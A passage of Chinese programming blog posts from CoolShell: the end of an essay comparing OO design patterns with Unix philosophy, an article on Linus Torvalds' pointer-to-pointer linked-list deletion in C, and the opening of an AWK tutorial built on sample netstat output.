<p><strong>Bridge模式</strong>，桥接模式。这个模式用的更多，比如一个灯具可以接各种灯泡或灯管，一个电钻可以换上不同的钻头来适应不同的材料，一辆汽车可以随时更换不同的轮胎来适应不同的路面，你的桌面可以随时更换一个图片来适应你的心情，你的单反相机可以更换不同的镜头来拍不同的照片…… 桥接模式说白了就是组件化，模块化，可以自由拼装。在OO中，其主要是通过让业务类组合一个标准接口来完成，这在非OO的程序设计中用得实在是太多了，主要是通过回调函数或是标准接口来实现。这个也是Unix设计哲学中的主要思想。<strong>在Unix中，文件的权限使用的就是Bridge模式，标准接口是用户，用户组和其它，rwx三个模式，然后用 chmod/chown改一改，这文件就有不同的属主和属性了</strong>。</p>
<p><strong>Decorator模式</strong>，装饰模式。这个模式在生活中太多了，你给你的手机或电脑贴个什么，挂个什么，吃东西的时候加点什么佐料，多点肉还是多个蛋，一个Unix/Linux命令的各种参数是对这个命令的修饰，等等。<strong>我觉得这个模式在Unix中最经常的体现就是通过管道把命令连接起来来完成一个功能</strong>，比如：ps -elf  是列进程的，用管道 grep hchen就可以达到过滤的目的，grep的逻辑没有侵入ps中，grep 修饰了 ps，但是其组合起来完成了一个特定的功能。可见，这和OO没有什么关系。</p>
<p><strong>Facade模式，</strong>这个模式我们每个人从会编程的时候就在无意识地用这个模式了。这个模式就是把一大堆类拼装起来，并统一往外提供提口。在现实生活中这样的例子太多了，比如：旅行社把机票，酒店，景点，导游，司机，进店打了一个包叫旅行；IBM把主机，存储，OS，J2EE，DB，网络，流程打了个包叫企业级解决方案。Unix中最典型的一个例子就是用Shell脚本组合各种命令来创造一个新的功能，这是的Shell中的各种命令通过标准I/O这个接口进行组合交互。</p>
<p><strong>Proxy模式</strong>，代理模式。我们租个房，买个机票，打个官司，都少不了代理，人大代表代理了老百姓去行使政治权力。我们去饭馆里吃饭也是一种代理模式，因为我们只管吃就好了，洗菜做饭洗碗的工作都被Proxy帮你干了，于是你就省事多了。操作系统就是硬件的代理，CDN就是网站的代理，……使用代理你可以让事情变理更简单，也可以在代理层加入一些权限检查，这样可以让业务模块更关注业务，而把一些非业务的事情剥离出来交给代理以完成解耦。可见这个模式和OO没啥关系。<strong>Unix下这个模式最佳体现就是Shell，它代理了系统调用并提供UI</strong>。还有很多命令会帮你把/proc目录下的那些文件内容整理和显示出来。</p>
<p><strong>Chain of Responsibility模式</strong>，劫匪来抢银行，保安搞不定，就交给110，110搞不定就交给武警。有什么事件发生时的响应的Escalation Path，办公中的逐级审批。这个模式用一个函数指针数组或是栈结构就可以实现了。这个思想很像编程中的异常处理机制，一层一层地往上传递异常直到异常被捕捉。<strong>在Unix下，一个最简单的例子就是用 &amp;&amp; 或 || 来把命令拼起来，如：cmd1 &amp;&amp; cmd2  或 cmd3 || cmd4 ， 如果cmd1失败了，cmd2就不会执行，如果cmd3失败了，cmd4才会执行。</strong>如： cd lib &amp;&amp; rm -rf .o 或 ping -c1 coolshell.cn &amp;&amp; ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="167e7779737a567579797a657e737a7a387578">[email protected]</a></p>
<p><strong>Command模式</strong>，这恐怕是软件里最多的模式了，比如：编译器里的Undo/Redo，宏录制。还有数据库的事务处理，线程池，设置向导，包括程序并行执行的指令集等等。这个模式主要是把一个对象的行为封装成一个一个的有相同接口的command，然后交给一个统一的命令执行器执行或管理这些命令。<strong>这个模式和我们的Unix/Linux机器启动时在/etc/init.d下的那些S和K开头的脚本很像，把各种daemon的启动和退出行为封装成一个脚本其支持reload/start/stop/status这样的命令，然后把他们按一定的规范做符号链接到/etc/init.d目录下，这样操作系统就会接管这些daemon的启动和退出</strong>。</p>
<p><strong>Observer模式</strong>，观察者模式，这个模式也叫pub-sub模式，很像我们用手机订阅手机报，微博的follow的信息流也是这样的一个模式。MVC中的C会sub V中的事件，用非OO的方式其实也是一个回调函数的事。在很多异步系统中，你需要知道最终的调用有没有成功，比如说调用支付宝的支付接口，你需要向支付宝注册一个回调的接口，以便支付宝回调你。<strong>Linux下的一些系统调用如epoll/aio/inotify/signal都是这种思路</strong>。</p>
<p><strong>Strategy 模式</strong>，策略模式，这个模式和Bridge模式很像，只不过Bridge是结构模式，其主要是用于对象的构造；而Strategy是行为模式，主要是用于对象的行为。策略模式很像浏览器里的各种插件，只要你装了某个插件，你就有某个功能。你可以安装多个插件来让你的浏览器有更多的功能（书本上的这个模式是你只能选用一个算法，当然，我们不用那么教条）。<strong>就像《<a title="你可能不知道的Shell" href="https://coolshell.cn/articles/8619.html" target="_blank">你可能不知道的Shell</a>》中的那个设置设置$EDITOR变量后可以按ctrl+x e启动编译器，或是用set -o vi或set -o emacs 来让自己的shell像vi或 emacs 一样，或是像find -exec或xargs一样的拼装命令</strong>。</p>
<p><strong>Bridge 和 Strategy是OO设计模式里的“Favor Composition Over Inheritance” 的典范，其实现了接口与实现分离的</strong>。Unix中的Shell就是一种，你可随意地更换不同的Shell。还有Emacs中的LISP驱动C，C实现了引擎，交给LISP实现逻辑。把程序分为前端和后端，通过socket专用应用协议进行通讯，前端实现策略，后端实现机制。再看看makefile把编译器和源代码的解耦，命令行输出这个接口可以把一个复杂的功能解耦并抽像成各种各样小而美的小功能命令，等等这样的例子，你会发现，还有大量的编程框架都会多少采用这样的思想，可以让你的软件像更换汽车零件一样方便。我在用<a title="用Unix的设计思想来应对多变的需求" href="https://coolshell.cn/articles/7236.html" target="_blank">Unix的设计思想来应对变更的需求</a>中说过灯具厂，灯泡厂，和开关厂的例子。</p>
<h4>
<span class="ez-toc-section" id="%E5%90%8E%E8%AE%B0"></span>后记<span class="ez-toc-section-end"></span>
</h4>
<p>因为写作仓促，上面的那些东西，可能会你让你觉得有些牵强，那么抱歉了，你可以帮我看看在生活中和 Unix里有没有更帅的例子。</p>
<p>不过，我们会发现上面OO搞出来的那么多模式在Unix下看来好像没有那么复杂，而且Unix下看起来并没有那么多模式，而且Unix中的设计模式无非就是这么几个关键词：<strong>单一，简洁，模块，拼装</strong>。我们再来看看OO设计的两大准则：<strong>1）钟情于组合而不是继承，2）依赖于接口而不是实现</strong>。还有S.O.L.I.D原则也一样（如果你仔细观察，你会发现SOLID原则在Unix下也是完美地体现）。你看，Unix和OO设计模式是不是完美的统一吗？</p>
<p>我有种强烈的感觉——<strong>Unix对这些所谓的OO的设计模式实现得更好</strong>。因为Unix就一条设计模式！再次推荐《<em><a href="https://book.douban.com/subject/5387401/" target="_blank">The Art of Unix Programming</a></em>》</p>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E9%A4%90%E5%90%8E%E7%94%9C%E7%82%B9"></span>餐后甜点<span class="ez-toc-section-end"></span>
</h4>
<p>我上面提到了《<em><a href="https://book.douban.com/subject/5387401/" target="_blank">The Art of Unix Programming</a></em>》，所以我有必要再谈谈这本书中我中毒最深的一章《模块性：保持清晰和简洁》中所谈到的胶合层。</p>
<p>胶合层这一节中说了，我们开发软件一般要么Top-Down，要么Bottom-Up，这两种方法都有好有不好。顶层一般是应用逻辑层，底层一般是原语层（我理解为技术沉淀层，或是技术基础层）。自顶向下的开发，你可能会因为开发到底层后发现底层可沉淀的东西越来越不爽（因为被可能被很多业务逻辑所侵入），如果自底向上的开发，你可能越到上层你越发现很多你下面干的基础上工作有很多用不上（比如干多了）。所以，最好的方式是同时进行，一会顶层，一会底层，来来回回的开发——说白了就是在开发中不断的重构，边开发边理解边沉淀。</p>
<p>无论怎么样，你会发现需要一层胶合层来胶合业务逻辑层和底层原语层（软件开发中的业务层和技术层的胶合），Unix的设计哲学认为，这层胶合层应该尽量地薄，胶合层越多，我们就只能在其中苦苦挣扎。</p>
<p>其实，<strong>胶合层原则就是分离原则上更为上层地体现，策略（业务逻辑）和机制（基础技术或原语）的清楚的分离。你可以看到，OO和Unix都是在做这样的分离。但是需要注意到的时，OO用抽象接口来做这个分离——很多OO的模式中，抽象层太多了，导致胶合层太过于复杂了，也就是说，OO鼓励了——“厚重地胶合和复杂层次”，反而增加了程序的复杂度（这种情况在恶化中）。而Unix采用的是薄的胶合层，薄地相当的优雅</strong>。（通过这段话的描述，我相信你会明白了《<a title="如此理解面向对象编程" href="https://coolshell.cn/articles/8745.html" target="_blank" rel="bookmark">如此理解面向对象编程</a>》中的个例子——为什么用OO来实现会比用非OO来实现更为地恶心——那就是因为OO胶合层太复杂了）</p>
<p><strong>OO的最大的问题就——接口复杂度太高，胶合层太多！</strong>（注：Unix编程艺术这本书里说了软件有三个复杂度：代码量、接口、实现，这三个东西构成了我们的软件复杂度）</p>
<h4>
<span class="ez-toc-section" id="%E5%86%8D%E9%80%81%E4%B8%80%E4%B8%AA%E6%9E%9C%E7%9B%98"></span>再送一个果盘<span class="ez-toc-section-end"></span>
</h4>
<p>大家一定记得《<a title="SteveY对Amazon和Google平台的长篇大论 - 60,581 人阅读" href="https://coolshell.cn/articles/5701.html">SteveY对Amazon和Google平台的长篇大论</a>》中Amazon中那个令人非常向往的SOA式的架构。因为以前在Amazon，有些话不好说。现在可以说了，我在Amazon里，我个人对这个服务化的架构相当的不待见，太复杂，复杂以乱七八糟，方向是好的，想法也是好的，但是这东西和OO一样，造成大量的接口复杂度，今天的Amazon，完全没人知道各个服务是怎么个调用的，一团乱麻（其内部并不像你看到的AWS那么的美妙。注：AWS是非常不错的，是相当好的设计）。</p>
<p><strong>那么我们怎么来解决SOA的接口复杂度问题？其实，Unix早就给出了答案——数据驱动编程</strong>（详见：《Unix编程艺术》的第9.1章），在我离开Amazon的时候，美国总部的Principle SDE们在吐槽今天Amazon的SOA架构，更好的架构应该是数据驱动式的。（今天还在Amazon的同学可以上内网boardcast上看看相关的Principle Talk视频）</p>
<p>（瞎扯一句：这本来是我想在2012年杭州QCon上的分享的一个主题，无奈当时被大会组织者给拒了，所以只好讲了一个《建一支小团队》，今天有多人还是不能明白甚至反感我的那个《小团队》的演讲，但是我相信那是必然的趋势，就像十年前大家在说“程序员只能干到30岁”时，当时的我我却毫不犹豫地相信十年后，30岁以上的有经验的老程序员一定会成为各个公司角逐和竟争的红人）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-02-01T08:15:59+08:00</pubDate>
<guid>https://coolshell.cn/articles/8961.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Linus：利用二级指针删除单向链表 ]]></title>
<link>https://coolshell.cn/articles/8990.html</link>
<content><![CDATA[ 
<p><strong>感谢网友full_of_bull投递此文</strong>（注：此文最初发表在这个<a href="http://www.oldlinux.org/oldlinux/viewthread.php?tid=14575&amp;extra=page%3D1" target="_blank">这里</a>，我对原文后半段修改了许多，并加入了插图）</p>
<p>Linus大婶在<a href="http://meta.slashdot.org/story/12/10/11/0030249/linus-torvalds-answers-your-questions" target="_blank">slashdot</a>上回答一些编程爱好者的提问，其中一个人问他什么样的代码是他所喜好的，大婶表述了自己一些观点之后，举了一个指针的例子，解释了什么才是<strong>core low-level coding</strong>。</p>
<p>下面是Linus的教学原文及翻译——</p>
<p style="padding-left: 30px;">“At the opposite end of the spectrum, I actually wish more people understood the really core low-level kind of coding. Not big, complex stuff like the lockless name lookup, but simply good use of pointers-to-pointers etc. For example, I’ve seen too many people who delete a singly-linked list entry by keeping track of the “prev” entry, and then to delete the entry, doing something like。（在这段话的最后，我实际上希望更多的人了解什么是真正的核心底层代码。这并不像无锁文件名查询（注：可能是git源码里的设计）那样庞大、复杂，只是仅仅像诸如使用二级指针那样简单的技术。例如，我见过很多人在删除一个单项链表的时候，维护了一个”prev”表项指针，然后删除当前表项，就像这样）”</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">if (prev)
    prev-&gt;next = entry-&gt;next;
else
    list_head = entry-&gt;next;</pre>
<p style="padding-left: 30px;">and whenever I see code like that, I just go “This person doesn’t understand pointers”. And it’s sadly quite common.（当我看到这样的代码时，我就会想“这个人不了解指针”。令人难过的是这太常见了。）</p>
<p><span id="more-8990"></span></p>
<p style="padding-left: 30px;">People who understand pointers just use a “pointer to the entry pointer”, and initialize that with the address of the list_head. And then as they traverse the list, they can remove the entry without using any conditionals, by just doing a “*pp = entry-&gt;next”. （了解指针的人会使用链表头的地址来初始化一个“指向节点指针的指针”。当遍历链表的时候，可以不用任何条件判断（注：指prev是否为链表头）就能移除某个节点，只要写)</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">*pp = entry-&gt;next</code></p>
<p style="padding-left: 30px;">So there’s lots of pride in doing the small details right. It may not be big and important code, but I do like seeing code where people really thought about the details, and clearly also were thinking about the compiler being able to generate efficient code (rather than hoping that the compiler is so smart that it can make efficient code *despite* the state of the original source code). （纠正细节是令人自豪的事。也许这段代码并非庞大和重要，<strong>但我喜欢看那些注重代码细节的人写的代码，也就是清楚地了解如何才能编译出有效代码</strong>（而不是寄望于聪明的编译器来产生有效代码，即使是那些原始的汇编代码））。</p>
<p>Linus举了一个单向链表的例子，但给出的代码太短了，一般的人很难搞明白这两个代码后面的含义。正好，有个编程爱好者阅读了这段话，并给出了一个<a href="http://wordaligned.org/articles/two-star-programming" target="_blank">比较完整的代码</a>。他的话我就不翻译了，下面给出代码说明。</p>
<p>如果我们需要写一个remove_if(link*, rm_cond_func*)的函数，也就是传入一个单向链表，和一个自定义的是否删除的函数，然后返回处理后的链接。</p>
<p>这个代码不难，基本上所有的教科书都会提供下面的代码示例，而这种写法也是大公司的面试题<strong>标准</strong>模板：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">typedef struct node
{
    struct node * next;
    ....
} node;

typedef bool (* remove_fn)(node const * v);

// Remove all nodes from the supplied list for which the
// supplied remove function returns true.
// Returns the new head of the list.
node * remove_if(node * head, remove_fn rm)
{
    for (node * prev = NULL, * curr = head; curr != NULL; )
    {
        node * const next = curr-&gt;next;
        if (rm(curr))
        {
            if (prev)
                prev-&gt;next = next;
            else
                head = next;
            free(curr);
        }
        else
            prev = curr;
        curr = next;
    }
    return head;
}</pre>
<p>这里remove_fn由调用查提供的一个是否删除当前实体结点的函数指针，其会判断删除条件是否成立。这段代码维护了两个节点指针prev和curr，<strong>标准的教科书写法——删除当前结点时，需要一个previous的指针，并且还要这里还需要做一个边界条件的判断——curr是否为链表头</strong>。于是，要删除一个节点（不是表头），只要将前一个节点的next指向当前节点的next指向的对象，即下一个节点（即：prev-&gt;next = curr-&gt;next），然后释放当前节点。</p>
<p>但在Linus看来，这是不懂指针的人的做法。那么，什么是core low-level coding呢？那就是<strong>有效地利用二级指针，将其作为管理和操作链表的首要选项。</strong>代码如下：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW" data-enlighter-highlight="5,8,12">void remove_if(node ** head, remove_fn rm)
{
    for (node** curr = head; *curr; )
    {
        node * entry = *curr;
        if (rm(entry))
        {
            *curr = entry-&gt;next;
            free(entry);
        }
        else
            curr = &amp;entry-&gt;next;
    }
}</pre>
<p>同上一段代码有何改进呢？我们看到：<strong>不需要prev指针了，也不需要再去判断是否为链表头了，但是，<span style="color: #cc0000;">curr变成了一个指向指针的指针</span></strong>。这正是这段程序的精妙之处。（注意，我所highlight的那三行代码）</p>
<p>让我们来人肉跑一下这个代码，对于——</p>
<ul>
<li>
<strong>删除节点是表头</strong>的情况，输入参数中传入head的二级指针，在for循环里将其初始化curr，然后entry就是*head(*curr)，我们马上删除它，那么第8行就等效于*head = (*head)-&gt;next，就是删除表头的实现。</li>
</ul>
<ul>
<li>
<strong>删除节点不是表头</strong>的情况，对于上面的代码，我们可以看到——</li>
</ul>
<p style="padding-left: 30px;"><strong>1）<strong>（第12行）</strong>如果不删除当前结点 —— curr保存的是当前结点next指针的地址</strong>。</p>
<p style="padding-left: 30px;"><strong>2）（第5行） entry 保存了 *curr <strong>—— </strong>这意味着在下一次循环：entry就是prev-&gt;next指针所指向的内存。</strong></p>
<p style="padding-left: 30px;"><strong></strong><strong>3）（第8行）删除结点：*curr = entry-&gt;next; —— 于是：prev-&gt;next 指向了 entry -&gt; next;</strong></p>
<p>是不是很巧妙？我们可以只用一个二级指针来操作链表，对所有节点都一样。</p>
<p>如果你对上面的代码和描述理解上有困难的话，你可以看看下图的示意：</p>
<p><img alt="image placeholder" ></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-02-04T08:33:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/8990.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ AWK 简明教程 ]]></title>
<link>https://coolshell.cn/articles/9070.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >有一些网友看了前两天的《<a title="应该知道的Linux技巧" href="https://coolshell.cn/articles/8883.html" target="_blank">Linux下应该知道的技巧</a>》希望我能教教他们用awk和sed，所以，出现了这篇文章。我估计这些80后的年轻朋友可能对awk/sed这类上古神器有点陌生了，所以需要我这个老家伙来炒炒冷饭。<strong>况且，AWK是贝尔实验室1977年搞出来的文本出现神器，今年是蛇年，是AWK的本命年，而且年纪和我相仿，所以非常有必要为他写篇文章</strong>。</p>
<p>之所以叫AWK是因为其取了三位创始人 <a title="Alfred Aho" href="https://en.wikipedia.org/wiki/Alfred_Aho">Alfred Aho</a>，<a title="Peter J. Weinberger" href="https://en.wikipedia.org/wiki/Peter_J._Weinberger">Peter Weinberger</a>, 和 <a title="Brian Kernighan" href="https://en.wikipedia.org/wiki/Brian_Kernighan">Brian Kernighan</a> 的Family Name的首字符。要学AWK，就得提一提AWK的一本相当经典的书《<a href="http://plan9.bell-labs.com/cm/cs/awkbook/" rel="nofollow">The AWK Programming Language</a>》，它在<a href="https://book.douban.com/subject/1876898/" target="_blank">豆瓣上的评分</a>是9.4分！在<a href="https://www.amazon.cn/mn/detailApp/?asin=020107981X" target="_blank">亚马逊上居然卖1022.30元</a>。</p>
<p>我在这里的教程并不想面面俱到，本文和我之前的<a title="Go 语言简介（上）— 语法" href="https://coolshell.cn/articles/8460.html" target="_blank">Go语言简介</a>一样，全是示例，基本无废话。</p>
<p><strong>我只想达到两个目的：</strong></p>
<p style="text-align: left; padding-left: 30px;"><strong>1）你可以在乘坐公交地铁上下班，或是在坐马桶拉大便时读完（保证是一泡大便的工夫）。</strong></p>
<p style="text-align: left; padding-left: 30px;"><strong>2）我只想让这篇博文像一个火辣的脱衣舞女挑起你的兴趣，然后还要你自己去下工夫去撸。</strong></p>
<p>废话少说，我们开始脱吧（注：这里只是topless）。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E8%B5%B7%E6%AD%A5%E4%B8%8A%E5%8F%B0" title="起步上台">起步上台</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#%E8%84%B1%E6%8E%89%E5%A4%96%E5%A5%97" title="脱掉外套">脱掉外套</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%BF%87%E6%BB%A4%E8%AE%B0%E5%BD%95" title="过滤记录">过滤记录</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%86%85%E5%BB%BA%E5%8F%98%E9%87%8F" title="内建变量">内建变量</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%8C%87%E5%AE%9A%E5%88%86%E9%9A%94%E7%AC%A6" title="指定分隔符">指定分隔符</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-6" href="#%E8%84%B1%E6%8E%89%E8%A1%AC%E8%A1%AB" title="脱掉衬衫">脱掉衬衫</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D" title="字符串匹配">字符串匹配</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#%E7%BB%9F%E8%AE%A1" title="统计">统计</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-9" href="#%E8%84%B1%E6%8E%89%E5%86%85%E8%A1%A3" title="脱掉内衣">脱掉内衣</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#awk%E8%84%9A%E6%9C%AC" title="awk脚本">awk脚本</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F" title="环境变量">环境变量</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#%E5%87%A0%E4%B8%AA%E8%8A%B1%E6%B4%BB" title="几个花活">几个花活</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#%E8%87%AA%E5%B7%B1%E6%92%B8%E5%90%A7" title="自己撸吧">自己撸吧</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E8%B5%B7%E6%AD%A5%E4%B8%8A%E5%8F%B0"></span>起步上台<span class="ez-toc-section-end"></span>
</h4>
<p>我从netstat命令中提取了如下信息作为用例：</p>
<p><span id="more-9070"></span></p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ cat netstat.txt
Proto Recv-Q Send-Q Local-Address          Foreign-Address             State
tcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN
tcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN
tcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN
tcp        0      0 coolshell.cn:80        124.205.5.146:18245         TIME_WAIT
tcp        0      0 coolshell.cn:80        61.140.101.185:37538        FIN_WAIT2
tcp        0      0 coolshell.cn:80        110.194.134.189:1032        ESTABLISHED
tcp        0      0 coolshell.cn:80        123.169.124.111:49809       ESTABLISHED
tcp        0      0 coolshell.cn:80        116.234.127.77:11502        FIN_WAIT2
tcp        0      0 coolshell.cn:80        123.169.124.111:49829       ESTABLISHED
tcp        0      0 coolshell.cn:80        183.60.215.36:36970         TIME_WAIT
tcp        0   4166 coolshell.cn:80        61.148.242.38:30901         ESTABLISHED
tcp        0      1 coolshell.cn:80        124.152.181.209:26825       FIN_WAIT1
tcp        0      0 coolshell.cn:80        110.194.134.189:4796        ESTABLISHED
tcp        0      0 coolshell.cn:80        183.60.212.163:51082        TIME_WAIT
tcp        0      1 coolshell.cn:80        208.115.113.92:50601        LAST_ACK
tcp        0      0 coolshell.cn:80        123.169.124.111:49840       ESTABLISHED
tcp        0      0 coolshell.cn:80        117.136.20.85:50025         FIN_WAIT2
tcp        0      0 :::22                  :::*                        LISTEN
</pre>
<p>下面是最简单最常用的awk示例，其输出第1列和第4例，</p>
<ul>
<li>其中单引号中的被大括号括着的就是awk的语句，注意，其只能被单引号包含。</li>
<li>其中的$1..$n表示第几例。注：$0表示整个行。</li>
</ul>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk '{print $1, $4}' netstat.txt
Proto Local-Address
tcp 0.0.0.0:3306
tcp 0.0.0.0:80
tcp 127.0.0.1:9000
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp coolshell.cn:80
tcp :::22</pre>
<p>我们再来看看awk的格式化输出，和C语言的printf没什么两样：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk '{printf "%-8s %-8s %-8s %-18s %-22s %-15s\n",$1,$2,$3,$4,$5,$6}' netstat.txt
Proto    Recv-Q   Send-Q   Local-Address      Foreign-Address        State
tcp      0        0        0.0.0.0:3306       0.0.0.0:*              LISTEN
tcp      0        0        0.0.0.0:80         0.0.0.0:*              LISTEN
tcp      0        0        127.0.0.1:9000     0.0.0.0:*              LISTEN
tcp      0        0        coolshell.cn:80    124.205.5.146:18245    TIME_WAIT
tcp      0        0        coolshell.cn:80    61.140.101.185:37538   FIN_WAIT2
tcp      0        0        coolshell.cn:80    110.194.134.189:1032   ESTABLISHED
tcp      0        0        coolshell.cn:80    123.169.124.111:49809  ESTABLISHED
tcp      0        0        coolshell.cn:80    116.234.127.77:11502   FIN_WAIT2
tcp      0        0        coolshell.cn:80    123.169.124.111:49829  ESTABLISHED
tcp      0        0        coolshell.cn:80    183.60.215.36:36970    TIME_WAIT
tcp      0        4166     coolshell.cn:80    61.148.242.38:30901    ESTABLISHED
tcp      0        1        coolshell.cn:80    124.152.181.209:26825  FIN_WAIT1
tcp      0        0        coolshell.cn:80    110.194.134.189:4796   ESTABLISHED
tcp      0        0        coolshell.cn:80    183.60.212.163:51082   TIME_WAIT
tcp      0        1        coolshell.cn:80    208.115.113.92:50601   LAST_ACK
tcp      0        0        coolshell.cn:80    123.169.124.111:49840  ESTABLISHED
tcp      0        0        coolshell.cn:80    117.136.20.85:50025    FIN_WAIT2
tcp      0        0        :::22              :::*                   LISTEN</pre>
<h4>
<span class="ez-toc-section" id="%E8%84%B1%E6%8E%89%E5%A4%96%E5%A5%97"></span>脱掉外套<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="%E8%BF%87%E6%BB%A4%E8%AE%B0%E5%BD%95"></span>过滤记录<span class="ez-toc-section-end"></span>
</h5>
<p>我们再来看看如何过滤记录（下面过滤条件为：第三列的值为0 &amp;&amp; 第6列的值为LISTEN）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk '$3==0 &amp;&amp; $6=="LISTEN" ' netstat.txt
tcp        0      0 0.0.0.0:3306               0.0.0.0:*              LISTEN
tcp        0      0 0.0.0.0:80                 0.0.0.0:*              LISTEN
tcp        0      0 127.0.0.1:9000             0.0.0.0:*              LISTEN
tcp        0      0 :::22                      :::*                   LISTEN</pre>
<p>其中的“==”为比较运算符。其他比较运算符：!=, &gt;, &lt;, &gt;=, &lt;=</p>
<p>我们来看看各种过滤记录的方式：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk ' $3&gt;0 {print $0}' netstat.txt
Proto Recv-Q Send-Q Local-Address          Foreign-Address             State
tcp        0   4166 coolshell.cn:80        61.148.242.38:30901         ESTABLISHED
tcp        0      1 coolshell.cn:80        124.152.181.209:26825       FIN_WAIT1
tcp        0      1 coolshell.cn:80        208.115.113.92:50601        LAST_ACK</pre>
<p>如果我们需要表头的话，我们可以引入内建变量NR：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk '$3==0 &amp;&amp; $6=="LISTEN" || NR==1 ' netstat.txt
Proto Recv-Q Send-Q Local-Address          Foreign-Address             State
tcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN
tcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN
tcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN
tcp        0      0 :::22                  :::*                        LISTEN</pre>
<p>再加上格式化输出：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk '$3==0 &amp;&amp; $6=="LISTEN" || NR==1 {printf "%-20s %-20s %s\n",$4,$5,$6}' netstat.txt
Local-Address        Foreign-Address      State
0.0.0.0:3306         0.0.0.0:*            LISTEN
0.0.0.0:80           0.0.0.0:*            LISTEN
127.0.0.1:9000       0.0.0.0:*            LISTEN
:::22                :::*                 LISTEN</pre>
<h5>
<span class="ez-toc-section" id="%E5%86%85%E5%BB%BA%E5%8F%98%E9%87%8F"></span><strong>内建变量</strong><span class="ez-toc-section-end"></span>
</h5>
<p>说到了内建变量，我们可以来看看awk的一些内建变量：</p>
<table border="0" cellspacing="1" cellpadding="4">
<tbody>
<tr>
<td bgcolor="#ffffff">$0</td>
<td bgcolor="#ffffff">当前记录（这个变量中存放着整个行的内容）</td>
</tr>
<tr>
<td bgcolor="#ffffff">$1~$n</td>
<td bgcolor="#ffffff">当前记录的第n个字段，字段间由FS分隔</td>
</tr>
<tr>
<td bgcolor="#ffffff">FS</td>
<td bgcolor="#ffffff">输入字段分隔符 默认是空格或Tab</td>
</tr>
<tr>
<td bgcolor="#ffffff">NF</td>
<td bgcolor="#ffffff">当前记录中的字段个数，就是有多少列</td>
</tr>
<tr>
<td bgcolor="#ffffff">NR</td>
<td bgcolor="#ffffff">已经读出的记录数，就是行号，从1开始，如果有多个文件话，这个值也是不断累加中。</td>
</tr>
<tr>
<td bgcolor="#ffffff">FNR</td>
